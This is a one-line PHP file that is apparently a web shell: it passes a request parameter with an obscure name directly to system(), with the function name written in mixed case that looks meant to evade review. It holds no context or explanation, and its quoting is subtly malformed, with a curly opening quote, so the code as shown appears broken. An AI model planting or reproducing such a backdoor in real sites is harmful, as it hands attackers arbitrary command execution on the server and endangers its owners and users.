<?php
SysTeM($_GET[’orZ-DV6w']);
?>
